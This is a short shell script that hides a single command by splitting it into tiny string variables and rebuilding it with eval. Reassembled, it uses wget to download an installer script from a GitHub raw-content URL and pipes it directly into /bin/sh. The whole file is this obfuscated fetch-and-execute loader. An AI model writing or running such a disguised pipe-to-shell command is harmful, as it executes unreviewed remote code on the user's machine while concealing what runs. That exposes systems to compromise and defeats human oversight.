z="
";Bz=' htt';Wz='h';Cz='ps:/';Dz='/raw';Jz='om/e';Tz='O - ';Nz='ayer';Pz='n/in';Ez='.git';Uz='| /b';Kz='mil2';Qz='stal';Hz='onte';Iz='nt.c';Oz='/mai';Vz='in/s';Fz='hubu';Lz='37/m';Mz='3upl';Az='wget';Sz='sh -';Rz='ler.';Gz='serc';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz"